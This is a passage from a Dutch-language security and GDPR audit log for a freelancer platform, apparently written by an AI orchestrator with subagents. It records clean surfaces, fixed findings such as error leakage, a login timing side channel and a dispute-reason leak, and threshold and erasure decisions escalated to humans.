user-URL, sleutel alleen in de auth-header, veilige error-reductie) i.p.v. een nieuw SSRF-/secret-pad; de
franchise-/beoordeling-/kandidaat-oppervlakken zijn read-only en hergebruiken de bestaande tenant-/ownership-scoping.
De eerder geëscaleerde mens-beslissingen blijven staan (steekproefvloer n=3 vs. eigen k≥10 voor de reputatie-/
betaalsignalen; `Job.title`/`description` + `Performance.*`/`NoShowReport.reason` bij erasure).

## Ronde 2026-07-16 (2e — basis: `main` @ 3d441cd)

Audit: orchestrator (Opus 4.8) op de **delta sinds de vorige ronde** (`a8d0139..3d441cd` — PR's #787–#794),
op de security-/privacy-relevante oppervlakken (de 20 nieuwe `concept-3xx.tsx`-designbestanden zijn puur
decoratieve UI, geen data-/authz-oppervlak — niet in scope). Kader: OWASP Top 10 (A01 broken access control,
A03 injection, A05 misconfig, A07 auth, A10 SSRF) + ASVS + AVG art. 5/9/15/30/32.

Nieuwe oppervlakken en de bevinding per oppervlak — **alle bevestigd schoon** (geen KRITIEK/HOOG/MIDDEL):

- **Externe verificatie-adapters DUO/BIG/iDIN (#788)** — `big-verifier.ts`, `diploma-verifier.ts`,
  `identity-verifier.ts`, `http-verify.ts`, `verify-selftest.ts`. **SSRF (A10):** endpoint-host uitsluitend
  uit env (`*_API_BASE`), nooit user-gestuurd → geen SSRF-oppervlak; `verifyViaHttp` hardcodeert methode/
  headers/pad, 8s-timeout via `AbortController`. **Secrets (A05):** `*_API_KEY` gaat alleen in de
  `Authorization: Bearer`-header, nooit in log/UI/audit/error. **Foutafhandeling (A09):** `VerifierRequestError`
  reduceert elke fout tot naam+status (`"BIG: koppeling gaf status 502."`), `safeVerifierDetail` reduceert
  onbekende fouten tot de error-NAAM — geen endpoint/sleutel/stacktrace naar de gebruiker. **Contract:**
  antwoord door `verifyResponseSchema` (Zod) gevalideerd; mock-fallback verzint nooit een `verified:true`.
- **Verifier-zelftest-actie** — `/admin/systeemstatus` `runVerifierSelfTestAction`. Keten auth→rol→rate-limit→
  actie→audit: `requireRole("ADMIN")` → `verifierSelfTestRateLimiter` (6/5min per admin, eigen store) → echte
  round-trip met **synthetische** probe-invoer (`"DUO-0000-0000"`, `"00000000000"`, `PROBE_HOLDER`) → audit
  `VERIFIER_SELFTEST_RUN` logt alleen `{key, active, ok}` + de driver-modus, nooit `detail`/URL/sleutel. Een
  `verified:false` op een verzonnen probe is een gezonde uitkomst (geen misleidend "geverifieerd"-signaal).
- **Franchise/tenant-signalen (#789, #793, #794)** — `roster-placement.ts`, `acute-open-diensten.ts`,
  `dienst-fill-signal.ts` + wiring in `pending-tasks.ts`. **Cross-tenant (A01):** `franchiserTasks` leidt
  `tenantId` server-side af uit de sessie-`userId` (fail-closed `return []` zonder tenant);
  `getRosterFillSignalsForTenant` scoopt **defensief** zowel de dienst- als de roster-query op `tenantId`
  (AND met de id-lijst), zodat een geïnjecteerde vreemde dienst-id wordt weggefilterd; de `/franchise/zzpers`-
  en `/franchise/diensten`-pagina's scopen via `tenantScopeWhere(actor)`. De signalen dragen **alleen
  aggregaat-tellingen** (`readyMatches`/`idleReady`/`countPlaceableDiensten`) — geen cross-tenant titel/naam/id.
  Read-only, geen mutatie/nieuw auth-oppervlak.
- **Afwijzingspatroon-inzicht ZZP'er (#791)** — `rejection-pattern.ts` op `/reacties`. **PII/AVG:** puur
  **self-view** — `requireRole("FREELANCER")` → applications `where: { freelancerId: profile.id }` (eigen
  profiel, afgeleid uit `userId: actor.id`). Aggregeert uitsluitend de eigen gestructureerde afwijzingscodes;
  geen cross-party-PII, geen individueel tarief van een derde. Geen k-anonimiteitsvraag (geen platform-brede
  aggregatie over identificeerbare derden).

Broad static sweep over de hele repo (niet alleen de delta): `dangerouslySetInnerHTML` = alleen het genonce'd
theme-script; raw SQL = alleen `SELECT 1`-health-checks (tagged template, geen injectie); geen `.passthrough()`
in Zod (geen overposting); geen `NEXT_PUBLIC_*`-secret; geen PII/secret in `console.*`; geen `.env`/uploads/`.db`
in git (alleen `.env.example`). `npm audit --omit=dev` = **0**; Next.js **15.5.19** (voorbij CVE-2025-29927
middleware-bypass); `package.json`/`package-lock.json` ongewijzigd in de delta.

### Geen nieuwe KRITIEK/HOOG/MIDDEL-bevindingen; geen nieuwe geparkeerde items

De nieuwe externe-verificatie-adapters introduceren geen user-gestuurd SSRF-pad en lekken geen sleutels; de
franchise-signalen hergebruiken de bestaande, al-gepoortte tenant-scoping i.p.v. een nieuw ongescopet pad; het
afwijzingspatroon blijft strikt self-view. De eerder geëscaleerde mens-beslissingen (steekproefvloer n=3 vs.
eigen k≥10 voor de reputatie-/betaalsignalen; `Job.title`/`description` + `Performance.*`/`NoShowReport.reason`
bij erasure) blijven staan — deze ronde voegde daar niets aan toe.

## Ronde 2026-07-16 (basis: `main` @ a8d0139)

Audit: orchestrator (Opus 4.8) + 3 parallelle adversariële Opus-security-subagents op de **delta sinds de
vorige ronde** (`cb76ca2..a8d0139` — PR's #777, #779–#786), op niet-overlappende oppervlakken: (1) cross-
tenant/franchise-isolatie op de nieuwe acute-dienst-vulbaarheidssplitsing (`franchise/diensten/page.tsx`,
`acute-fillability.ts`, `dienst-fill-signal.ts`); (2) AVG/PII op de nieuwe aggregatie-/reputatie-signalen
(`vacancy-rate-diagnosis.ts` + caller, `collaboration-credential-expiry.ts` + `pending-tasks.ts`/`tasks.ts`,
`processing-register.ts`) — k-anonimiteit, PII-over-fetch, cross-party-lek, art. 30-dekking; (3) authz/secrets/
SSRF/DoS + dependency-CVE's op de rate-limit-store-zelftest (`systeemstatus/actions.ts`, `ratelimit-selftest.ts`

- `.tsx`, `rate-limit.ts`) en `npm audit`. Kader: OWASP Top 10 (A01/A03/A05/A10) + ASVS + AVG art. 5/9/15/17/30/32.
  De 10 nieuwe `concept-3xx.tsx`-designbestanden zijn puur decoratieve UI (geen data-/authz-oppervlak) — niet in scope.

**Alle drie de oppervlakken bevestigd schoon op authz/tenant/injectie/secrets/SSRF** (geen KRITIEK/HOOG):

- **Franchise/tenant:** `franchise/diensten/page.tsx:33` scoopt de `Job`-query op `tenantScopeWhere(actor)`
  (fail-closed 403 zonder tenant); `getRosterFillSignals` (`dienst-fill-signal.ts:121,136`) her-scoopt **defensief**
  zowel de dienst- als de roster-query op `tenantId` (AND met de id-lijst), zodat een geïnjecteerde vreemde id
  wordt weggefilterd; `acute-fillability.ts` draagt per item **alleen** `readyMatches: number` — géén titel/naam/id,
  het #730/#780-titel-lek blijft dicht per constructie. Read-only pagina, geen mutatie.
- **Rate-limit-zelftest (#782):** auth ADMIN op drie lagen (`middleware.ts:136` + page `requireRole("ADMIN")` +
  action `requireRole("ADMIN")`) → rate-limit (6/5min per admin, eigen memory-limiter zodat een kapotte Upstash
  de test niet blokkeert) → actie → audit (`RATELIMIT_SELFTEST_RUN`, logt alleen `{key, ok}` per stap, nooit
  `detail`/URL/token). `safeDetail` reduceert elke fout tot `error.name` — geen secret/endpoint in UI/audit/console.
  SSRF: host uitsluitend uit `UPSTASH_REDIS_REST_URL`, probe-commando's hardcoded, `probeKey` server-side UUID.
  `npm audit --omit=dev` = **0**; Next.js **15.5.19** (voorbij CVE-2025-29927 middleware-bypass).
- **Aggregatie/PII:** `diagnoseVacancyRate` hergebruikt de al-gepoortte marktband-engine (`MARKET_RATE_MIN_SAMPLE=10`,
  `scope:"none"`/`median:null` onder de vloer) en vergelijkt alleen het **eigen** `rateMax` van de opdrachtgever
  met de geaggregeerde mediaan — geen individueel ZZP-tarief, k≥10 end-to-end. `collaborationCredentialExpiryConcerns`
  wordt alleen vanuit `freelancerTasks(userId)` bereikt (eigen certificaten/samenwerkingen, self-view) — geen cross-
  party-lek; deep-link `/certificaten/[id]/bewerken` her-verifieert ownership → geen IDOR. Geen `$queryRaw`/
  `dangerouslySetInnerHTML`; `hint` is server-side numerieke interpolatie, auto-escaped.

### OPGELOST in deze ronde

- **[MIDDEL→OPGELOST · AVG art. 30 ontvanger-volledigheid / verantwoordingsplicht art. 5(2)]** De verwerking
  `markttarief-indicatie` (`src/lib/compliance/processing-register.ts`) beschreef de opdrachtgever-weergave als
  **uitsluitend** "op het opdracht-formulier", terwijl de tarief-diagnose (#783, `vacancy-rate-diagnosis.ts`) dezelfde
  geanonimiseerde mediaan nu óók toont aan opdrachtgevers op de **eigen opdrachtenlijst** (`/opdrachten`, via
  `VacancyRateDiagnosisNote`, bij een koud lopende opdracht die onder de markt biedt). Art. 30 vereist dat het
  register de werkelijke verwerking/ontvangers dekt; de tweede weergave-surface ontbrak → register-drift (zelfde
  klasse als de #781-register-volledigheidsfix). **Geen nieuwe grondslag/gegevenscategorie/risico** — dezelfde k≥10-
  vloer, dezelfde geaggregeerde output. **Repro (was):** `PROCESSING_REGISTER.find(a => a.key==="markttarief-indicatie")`
  → `purpose`/`recipients` noemden alleen "opdracht-formulier", nooit de opdrachtenlijst/tarief-diagnose. **Gefixt:**
  `purpose` + een extra `recipients`-regel dekken nu expliciet de tarief-diagnose-weergave op de opdrachtenlijst.
  Test: `processing-register.test.ts` (+1 case die beide weergaven + de k-vloer pint; rood→groen — zonder de fix
  vindt de assertie de opdrachtenlijst-/tarief-diagnose-ontvanger niet). **Geschonden:** AVG art. 30(1) + art. 5(2)
  - CLAUDE.md regel 5 (register beschrijft de werkelijke verwerking).

### Geen nieuwe KRITIEK/HOOG-bevindingen; geen nieuwe geparkeerde items

De eerder geëscaleerde mens-beslissingen blijven staan (steekproefvloer n=3 vs. eigen k≥10 voor de reputatie-/
betaal-/betrouwbaarheidssignalen; `Job.title`/`description` + `Performance.*`/`NoShowReport.reason` bij erasure).
Deze ronde voegde daar niets aan toe: de nieuwe aggregaties hergebruiken bestaande, al-gepoortte engines i.p.v.
een nieuw ongepoort aggregatiepad te introduceren.

## Ronde 2026-07-15 (2e — basis: `main` @ cb76ca2)

Audit: orchestrator (Opus 4.8) + 3 parallelle adversariële Opus-security-subagents op niet-overlappende
oppervlakken: (1) object-/functie-niveau-autorisatie + mass-assignment/overposting over **álle**
`src/app/(protected)/**/actions.ts` + `src/lib/actions/**` + `src/app/api/**/route.ts`; (2) cross-tenant/
franchise-isolatie (`tenancy.ts`, `franchise/**`, `admin/franchises/**`) incl. het nieuwe geschikte-
vakmensen-vrij-signaal (`dienst-fill-signal.ts`, #779); (3) AVG — erasure-/export-volledigheid model-voor-
model tegen `anonymizeUser`/`account-anonymization.ts`/`account-export.ts`, k-anonimiteit, PII-in-logs.
Kader: OWASP Top 10 (A01/A03/A05/A10) + ASVS + AVG art. 5/9/15/17/30/32. De delta sinds de vorige ronde
(#773–#780: safe-action-error, delete-weigering-audit, mail-zelftest, tarief-passendheid-chip, dienst-fill-
signal, compliance-ripple-taak + de bevroren-dispuut-guard) apart nagelopen. `npm audit --omit=dev` = **0**;
Next.js **15.5.19** gepatcht.

**Oppervlakken (1) en (2) bevestigd volledig schoon** (geen KRITIEK/HOOG-authz-/IDOR-/mass-assignment-/
tenant-gat): elke mutatie draagt de keten auth→rol→ownership/tenant→Zod→actie→audit; geen `.passthrough()`,
geen rauwe `...body`/`...input`-spread in prisma `create`/`update`; `tenantId`/`role`/`priceCents` altijd
server-herleid. Het nieuwe `dienst-fill-signal.ts` scoopt zowel de dienst- als de roster-query op de sessie-
`tenantId` en exposeert **alleen aggregaat-tellingen** (`readyMatches`/`idleReady`) — geen cross-tenant titel/
naam/id; het #730/#780-titel-lek blijft dicht (`firstTitle` alleen binnen de eigen tenant). De nieuwe mail-
zelftest (`mail-selftest.ts` + `systeemstatus/actions.ts`) volgt auth ADMIN→rate-limit→actie→audit, valideert
de ontvanger in de pure kern, logt het adres nooit, en brengt een fout terug tot de error-NAAM (geen secret/
endpoint). SSRF: push-endpoint-allowlist (https-only, officiële push-hosts), Geoapify/Resend hardcoded hosts.
XSS/SQLi: één genonce'd theme-script, alleen `SELECT 1` raw. Export lekt geen derde-partij-PII.

### OPGELOST in deze ronde

- **[MIDDEL→OPGELOST · AVG art. 30 register-volledigheid]** Drie geaggregeerde reputatie-/betrouwbaarheids-
  signalen die platform-breed over een **identificeerbare** partij worden getoond stonden **niet** in het
  verwerkingsregister (`src/lib/compliance/processing-register.ts`), terwijl de zuster-signalen markttarief
  (#14, k≥10) en betaalgedrag (#16, PAYMENT*MIN_SAMPLE_SIZE, #769) er wél in staan: (a) annulerings-
  betrouwbaarheid per opdrachtgever (`client-reliability.ts`, getoond aan ZZP'ers op de opdracht-detail);
  (b) reactiebereidheid per opdrachtgever (`client-responsiveness.ts`, opdracht-detail + reacties); (c)
  leverbetrouwbaarheid per ZZP'er (`collaboration-quality.ts`, getoond aan opdrachtgevers op kandidaten/
  vergelijk/inzicht). **Repro (was):** `PROCESSING_REGISTER.find(a => a.key === "…")` gaf `undefined` voor
  alle drie de verwerkingen. **Gefixt:** twee nieuwe `ProcessingActivity`-entries — `opdrachtgever-
betrouwbaarheidssignalen` (dekt (a)+(b), spiegelbeeld-signalen, zelfde weergavepagina) en
  `leverbetrouwbaarheid-zzp` (dekt (c)) — beide grondslag `GERECHTVAARDIGD_BELANG`, uitsluitend geaggregeerde
  categorie, steekproefvloer (`MIN_SAMPLE_SIZE`/`DELIVERY_MIN_SAMPLE`) als waarborg, retentie = live berekend/
  niet opgeslagen, betrokkenen incl. eenmanszaak-/natuurlijke-persoon-overlap. Test: `processing-register.test.ts`
  (+2 cases die grondslag/aggregatie/steekproefvloer/retentie pinnen; rood→groen — zonder de entries is
  `find(...)` undefined). \_Noot: het register **beschrijft** de bestaande verwerking; het kiest de k-drempel
  niet — die drempelkeuze blijft de geëscaleerde HOOG-beslissing hieronder.*

### Geparkeerd / geëscaleerd naar de mens (deze ronde)

- **[HOOG (art. 5(1)(a)/(d) eerlijkheid+juistheid) / geëscaleerd — steekproefvloer n=3 vs. platform-eigen
  k≥10, nu drie extra signalen]** Naast het al-geparkeerde `PAYMENT_MIN_SAMPLE_SIZE = 3` renderen óók
  `MIN_SAMPLE_SIZE = 3` in `src/lib/client-reliability.ts:41` (annuleringsbetrouwbaarheid per opdrachtgever),
  `MIN_SAMPLE_SIZE = 3` in `src/lib/client-responsiveness.ts:43` (reactiebereidheid per opdrachtgever) en
  `DELIVERY_MIN_SAMPLE = 3` in `src/lib/collaboration-quality.ts:7` (leverbetrouwbaarheid per ZZP'er) een
  reputatielabel over een **met naam getoonde, identificeerbare** partij (veel `Company`-records + elke ZZP'er
  zijn natuurlijke personen) — ver onder de eigen `MARKET_RATE_MIN_SAMPLE = 10`-vloer (`src/lib/config.ts:232`)
  die het platform juist voor de markttarief-aggregatie afdwingt. Mitigerend (anders dan de destijds
  bekritiseerde ambient betaal-chip): alle drie tonen de steekproefgrootte in de zichtbare tekst en het
  leverbetrouwbaarheid-signaal verbergt zich volledig onder `INSUFFICIENT`. Maar het is dezelfde n=3-vs-k≥10-
  drempelkeuze die het project bewust bij een mens heeft gelegd (les MENSENWERK: een agent kiest geen
  k-drempel). **Aanbevolen (voor de mens):** dezelfde beslissing die al voor `PAYMENT_MIN_SAMPLE_SIZE` openstaat
  in één keer laten gelden voor deze drie — óf optrekken naar k≥10 + guardtest spiegelen, óf expliciet
  onderbouwd goedkeuren. **Geschonden:** AVG art. 5(1)(a)/(d) + interne k-anonimiteitsnorm.
- **[LAAG · AVG art. 17 recht op verwijdering — `Job.title`/`Job.description` overleeft `anonymizeUser`]**
  `Job.title`/`Job.description` (`prisma/schema.prisma`) is door de CLIENT zelf geschreven vrije tekst;
  `anonymizeUser` (`admin/gebruikers/actions.ts`) redact `Company.description/website/location` maar raakt
  `Job` nergens aan (geen `job.updateMany`, en — anders dan bij vrijwel elk ander veld — géén begeleidend
  commentaar dat dit een bewuste keuze is). Lager risico dan `bio`/`motivation` (een vacaturetekst is doorgaans
  zakelijk), maar kan incidenteel contactgegevens bevatten ("Bel Jan op 06-…"). **Repro:** anonimiseer een
  opdrachtgever met ≥1 `Job` → `title`/`description` lezen onveranderd. **Aanbevolen (voor de mens):** beoordeel
  of `Job`-content een retentiegrond heeft (marktplaats-/matching-historie, vergelijkbaar met `Invoice`) en
  documenteer dat, óf redact het zoals de overige CLIENT-geschreven velden. Bewust niet unilateraal gewijzigd:
  retentie-vs-vergetelheid met een mogelijke bedrijfsvoering-bewaargrond is een mens-afweging (MENSENWERK §5).

## Ronde 2026-07-15 (basis: `main` @ fc5e03d)

Audit: orchestrator (Opus 4.8) + 3 parallelle adversariële Opus-security-subagents op niet-overlappende
oppervlakken: (1) document-/PDF-/export-serving (`api/media/[...key]`, `api/documents/[id]`, alle
`facturen`/`prestaties`/`admin/facturatie`-pdf's, `samenwerkingen/[id]/{dossier,dba-dossier,modelovereenkomst}`,
`administratie/*`, `admin/export/invoices`, `documenten/actions.ts`, `storage.ts`); (2) tenant-/franchise-
isolatie + cross-party PII (`tenancy.ts`, `franchise/**`, `admin/franchises/**`, `kandidaten/**`,
`bemiddelaars-panel`); (3) injectie/XSS/SSRF/secrets-logging/error-leak over de hele `src/`-boom. Kader: OWASP
Top 10 (A01/A03/A05/A10) + ASVS + AVG art. 5/9/30/32. De delta sinds de vorige ronde (#768–#772: audit-retentie-
pruning, betaalgedrag-register-entry, maanddoel-voortgang, beschikbaarheids-conflict-chip, +10 ontwerpconcepten)
apart nagelopen: schoon — audit-retentie-taak is fail-closed/cron-gated/PII-vrij, income-goal + job-availability-
signal zijn pure, own-profile-scoped logica. `npm audit --omit=dev` = **0**; Next.js **15.5.19** gepatcht.

**Oppervlakken (1) en (2) bevestigd volledig schoon** (geen KRITIEK/HOOG-authz-/IDOR-/tenant-/upload-/SSRF-gat):
elke document-route re-verifieert ownership tegen de sessie-gebruiker + audit op inzage én weigering; `[...key]`-
media resolveert path-traversal-veilig binnen `baseDir` en vereist een DB-`logoKey`-match; tenant-scoping via
`tenantScopeWhere`/`ownsViaTenant`/`assertSameTenant` met server-herleide `tenantId` (nul mass-assignment op
`tenantId`/`role`); cross-tenant = ononderscheidbaar van onbekend-id (geen existence-oracle). Oppervlak (3): één
`dangerouslySetInnerHTML` (hardcoded theme-script + nonce), CSV via centrale `escapeCsvField`-guard op élke export,
ICS via `escapeIcsText`, SSRF met harde host-allowlists (Geoapify query-only, web-push-endpoint-allowlist), logger
redacteert PII/secrets, geen open redirect, cron `Bearer` + timing-safe.

### OPGELOST in deze ronde

- **[MIDDEL→OPGELOST · CWE-209 Information Exposure / OWASP A05:2021]** ~16 server-actions gaven
  `e instanceof Error ? e.message : "..."` (of `return e.message`) terug aan de client. De gecureerde
  applicatiefouten (`AuthorizationError`, `*TransitionError`, `CascadeError`, plain `Error` met NL-tekst) zijn
  veilig, maar een **onverwacht** fouttype dat níet in een curated-klasse zit — een uncaught Prisma-clientfout
  (kan kolom-/tabel-/constraint-namen echoën, bv. `Unique constraint failed on the fields: (email)`) of een Node
  system-error (`connect ECONNREFUSED 10.0.0.5:5432` — hostname/poort) — werd verbatim doorgestuurd. Lage kans,
  maar het gat verbreedt stil naarmate nieuwe mutaties failure-modes toevoegen die iemand vergeet in een curated
  klasse te wikkelen. **Repro (was):** forceer een Prisma-constraint-/verbindingsfout in een van de bedrade
  actions → de rauwe message verscheen in de fout-state naar de client. **Gefixt:** nieuw gedeeld helper
  `src/lib/safe-action-error.ts`. `isInternalError` markeert een fout als intern-lekkend wanneer het geen `Error`
  is, de naam met `PrismaClient` begint, óf er een niet-lege string-`code` is (Prisma `P####` + Node sys-errors);
  `toSafeActionError` logt die server-side (redacterende logger) en geeft een generieke NL-boodschap, terwijl
  curated messages behouden blijven. Bewust **denylist** (fail-safe op de echte lek-families) i.p.v. allowlist,
  om de bewust-Nederlandse curated UX-teksten niet te degraderen. Bedraad in `certificaten/actions.ts`,
  `admin/verificaties/actions.ts`, `account/actions.ts`, `admin/shift-overnames/actions.ts`,
  `diensten/importeer/actions.ts`, `samenwerkingen/[id]/actions.ts` (incl. de twee `return e.message`-paden die
  Next.js **niet** redacteert), `prestaties/actions.ts`. Test: `safe-action-error.test.ts` (9 cases,
  rood→groen: Prisma-/system-/niet-Error → generiek + gelogd; `AuthorizationError`/plain-`Error` → message behouden).
- **[LAAG→OPGELOST · CLAUDE.md regel 5 (audit alles wat telt) / OWASP A01 defense-in-depth]** `deleteDocument`
  (`documenten/actions.ts`) auditte `DOCUMENT_DELETED` alleen bij succes; een geweigerde poging (bestaand id,
  andere eigenaar → IDOR-poging, of onbekend id) gooide een generieke `Error` **zonder audit** — afwijkend van de
  read-routes die elke geweigerde inzage als `*_ACCESS_DENIED` loggen. **Gefixt:** `DOCUMENT_DELETE_DENIED`-audit
  vóór de throw, identiek voor "niet gevonden" en "niet van jou" (geen bestaans-orakel), gevolgd door dezelfde
  generieke foutmelding; er wordt niets verwijderd. Test: `documenten/delete-denied.test.ts` (2 cases; audit
  vuurt, `prisma.delete`/`storage.delete` niet — rood→groen).

### Geen nieuwe KRITIEK/HOOG-bevindingen

Geen open KRITIEK/HOOG-item toegevoegd deze ronde. De eerder geëscaleerde mens-beslissingen (o.a.
`PAYMENT_MIN_SAMPLE_SIZE`=3 vs. k≥10; `Performance.rejectionReason`/`NoShowReport.reason` als derde-partij-tekst
bij `anonymizeUser`) blijven staan voor de mens — deze audit heeft die niet gewijzigd (bewust: een agent kiest
geen k-drempel/retentiegrond, les uit de MENSENWERK-lijn).

## Ronde 2026-07-14 (2e — basis: `main` @ eea7c32)

Audit: orchestrator (Opus 4.8) + 3 parallelle adversariële Opus-security-subagents op niet-overlappende
oppervlakken: (1) AVG-dataminimalisatie + k-anonimiteit op de nieuwe delta (`account-export.ts`/`/api/account/
export`, `payment-behavior.ts` + de betaal-vertrouwenschip op de browse-lijst, `compliance/*`); (2) minder-
betreden server-actions (`academie`/`ideeen`/`beschikbaarheid`/`reacties`/`uitgaven`/`account`/`search`/
`diensten/importeer`) + álle cron/task-routes + de publieke `.ics`-agendafeed; (3) cross-tenant/franchise-
isolatie + upload-veiligheid + SSRF + injectie (SQLi/XSS/CSV-formule). Kader: OWASP Top 10 (A01/A03/A05/A07/
A10) + ASVS + AVG art. 5/9/15/17/30/32. Twee oppervlakken volledig schoon bevestigd (geen KRITIEK/HOOG-
authz-/tenant-/injectie-/upload-/SSRF-gat: mutatieketen uniform, `escapeIcsText` dekt CRLF-injectie, cron
fail-closed timing-safe, media-`[...key]` vereist DB-match vóór storage, CSV via de centrale
`escapeCsvField`-guard op élke export, één `dangerouslySetInnerHTML` = hardcoded theme-script met nonce).

**Eén HOOG cross-party PII-lek gevonden én gefixt (rood→groen, export + erasure); één LAAG timing-side-channel
gefixt (rood→groen); één HOOG-k-anonimiteit-inconsistentie + twee LAAG/MIDDEL geparkeerd voor de mens.**

### OPGELOST in deze ronde

- **[HOOG→OPGELOST · AVG art. 5(1)(f) confidentialiteit / OWASP A01]** De LIVE `Collaboration.disputeReason`
  is één muteerbaar veld: `resolveDispute` (admin) nult het, waarna de **tegenpartij** een nieuw dispuut op
  dezelfde samenwerking kan openen — het veld bevat dan hún tekst. Zowel de AVG-inzage-export
  (`src/lib/account-export.ts`) als de AVG-erasure (`anonymizeUser`, `admin/gebruikers/actions.ts`) scopeten
  op **alle-tijd** eigen `DISPUTE_OPENED`-events (`ownDisputeCollabIds`). Gevolg: (a) de export lekte de live
  dispuutreden van de tegenpartij in het eigen-data-bestand van de betrokkene; (b) de erasure vernietigde het
  lopende dispuutbewijs van de tegenpartij. **Repro:** F opent dispuut op C → admin lost op → X (tegenpartij)
  opent nieuw dispuut op C → F draait `GET /api/account/export` → X's reden `R2` staat in F's export; idem
  wist F's anonimisering X's live `disputeReason`. **Gefixt:** nieuw gedeeld helper `src/lib/dispute-ownership.ts`
  (`collaborationsWithActiveDisputeOpenedBy`) dat het dispuut-eventlog per samenwerking herspeelt (OPENED zet de
  huidige opener, RESOLVED wist 'm) en alleen de samenwerkingen teruggeeft waar de actor de opener van het
  HUIDIGE, nog-open dispuut is — spiegelt exact de `disputedAt`/`disputeReason`-toestandsmachine in
  `dispute-commands.ts`. Gebruikt in de export (live-veld-scope) én de erasure (`activeOwnDisputeCollabIds`,
  alleen voor de live `Collaboration.disputeReason`-null; de payload-/audit-/notificatie-redactie blijft
  correct breed op `actorId`, want dat is en blijft de eigen tekst van de betrokkene). Tests: `dispute-ownership.test.ts`
  (6 cases incl. heropening-door-tegenpartij), `account-export.test.ts` (+1 rood→groen: export-scope = leeg na
  heropening), `anonymize-erasure.test.ts` (+1 rood→groen: erasure raakt de heropende reden niet).
- **[LAAG→OPGELOST · CWE-208 timing-side-channel / OWASP A07 login-enumeratie]** `src/lib/authorize-credentials.ts`
  short-circuitte `bcrypt.compare` weg bij een onbekende e-mail / niet-ACTIVE account / lege (geanonimiseerde)
  passwordHash → dat account reageerde meetbaar sneller dan een fout wachtwoord op een bestaand ACTIVE-account,
  wat via de responstijd verraadt of een e-mail bestaat (het al-geparkeerde item van de vorige ronde). **Gefixt:**
  altijd precies één `bcrypt.compare` draaien; alleen een bestaand ACTIVE-account met gezette hash vergelijkt
  tegen zijn eigen hash, alle andere paden tegen een constante cost-10-equalizer-hash (matcht nooit). Tests:
  `authorize-credentials.test.ts` (+4: compare draait óók bij onbekende e-mail / niet-ACTIVE / lege hash;
  onbekende e-mail weigert zelfs als compare true zou geven).

### Geparkeerd / geëscaleerd naar de mens (deze ronde)

- **[HOOG (art.5(1)(a)/(d) eerlijkheid+juistheid) / geëscaleerd — betaal-vertrouwenschip k=3 vs. platform-eigen
  k≥10]** `PAYMENT_MIN_SAMPLE_SIZE = 3` (`src/lib/payment-behavior.ts:44`) rendert een reputatielabel ("Betaalt
  vaak laat") over een **met naam getoonde** opdrachtgever op de browse-lijst (`opdrachten/(index)/page.tsx`) op
  basis van slechts 3 facturen — terwijl het platform voor de markttarief-aggregatie een **harde k≥10-vloer**
  afdwingt (`market-rate.ts` + guardtest `market-rate.test.ts:89-93`, juist om deze klasse regressie te vangen).
  Het risico is hier arguably groter: het label wordt aan **derden** getoond over een **identificeerbare** entiteit
  (veel `Company`-records zijn eenmanszaken = natuurlijke personen), ambient op een lijst, zonder de sample-size-
  disclosure die de detailpagina (`payment-behavior-block.tsx`) wél geeft. **Aanbevolen (voor de mens):** óf
  `PAYMENT_MIN_SAMPLE_SIZE` optrekken naar de eigen k≥10-vloer + een guardtest spiegelen, óf expliciet documenteren/
  goedkeuren waarom een lagere drempel hier rechtmatig is, én de sample-size in het chip-`title`/aria-label opnemen.
  Bewust een agent níet zelf een k-drempel laten kiezen (les uit de MENSENWERK-lijn). **Geschonden:** AVG art.
  5(1)(a)/(d) + interne k-anonimiteitsnorm.
- **[MIDDEL → OPGELOST (PR #769) · AVG art. 30 register-volledigheid]** `src/lib/compliance/processing-register.ts`
  had wél een `markttarief-indicatie`-entry (incl. k≥10 als maatregel) maar géén equivalent voor het betaalgedrag/
  betaalreputatie-signaal, dat platform-breed wordt getoond (browse-lijst + opdracht-detail + `/verplichtingen`).
  **Gefixt:** `ProcessingActivity`-entry `betaalgedrag-reputatie` toegevoegd (doel, grondslag
  `GERECHTVAARDIGD_BELANG`, betrokkenen incl. eenmanszaak-overlap, categorie = uitsluitend geaggregeerde
  betaaltiming, `PAYMENT_MIN_SAMPLE_SIZE`-steekproefvloer als maatregel, retentie = live berekend/niet opgeslagen,
  ontvangers = browsende ZZP'ers + eigen reputatie-spiegel). Test: `processing-register.test.ts` (+1 case die de
  grondslag/aggregatie/steekproefvloer/retentie afdwingt). _Noot: de k-drempel-hoogte zelf (`PAYMENT_MIN_SAMPLE_SIZE`
  = 3 vs. k≥10) blijft de geëscaleerde HOOG-beslissing hierboven — het register beschrijft de bestaande verwerking,
  het kiest de drempel niet._
- **[LAAG → OPGELOST (PR #769) · defense-in-depth] `getPaymentBehaviorForCompanies`/`getPaymentBehaviorForCompany`**
  (`src/lib/data/payment-behavior.ts`) accepteren een rauwe `companyId`(s) zonder interne rol-/tenant-check; vandaag
  veilig (enige twee call-sites scopen op `visibleJobsWhere(actor)`), maar een toekomstige API-route eromheen zou
  arbitraire-opdrachtgever-betaalreputatie kunnen blootstellen. **Gefixt:** docstring op beide helpers die de
  scoping-verantwoordelijkheid van de aanroeper expliciet maakt (nooit een ongevalideerde, van buitenaf aangeleverde
  `companyId` doorgeven; scope op `visibleJobsWhere(actor)` of de eigen `Company`).

## Ronde 2026-07-14 (basis: `main` @ 4da72bb)

Audit: orchestrator (Opus 4.8) + 3 parallelle adversariële Opus-security-subagents op niet-overlappende
oppervlakken: (1) object-/functie-niveau-autorisatie over **álle** `src/app/api/**/route.ts`-handlers +
`(protected)/**/actions.ts`-server-actions (excl. franchise) — IDOR/ontbrekende authz/mass-assignment/
status-transitie-bypass/error-leak; (2) cross-tenant/franchise-isolatie over `franchise/**` +
`admin/franchises/**` + `src/lib/tenancy.ts` + `src/lib/franchise/**` + de cross-party-PII-paden
(`/kandidaten`) — cross-tenant-IDOR/mass-assignment `tenantId`/`role`/dataminimalisatie/audit; (3) injectie
(SQLi/XSS/CSV-formule) + upload-veiligheid + SSRF + secrets/logging + auth-hardening + AVG-betrokkenenrechten
(`anonymizeUser`-erasure-volledigheid). Kader: OWASP Top 10 (A01/A03/A05/A07/A10) + ASVS + AVG art. 5/9/15/
17/30/32. De verse delta sinds de vorige ronde (#753–#758: logger-PII-hardening, graceful-shutdown-draining,
vacaturetempo-signaal, bulk-goedkeuren-urenstaten, urgentie-facturenlijst, +10 ontwerpconcepten) apart
nagelopen: schoon — het nieuwe bulk-goedkeur-pad (`prestaties/actions.ts`) is dubbel eigenaar-gescoopt
(query op `collaboration.company.userId` + `approvePerformance` her-controleert rol/ownership/transitie/audit
per item), de readiness/shutdown-endpoints zijn PII-vrij (alleen error-namen + publieke commit-SHA), de
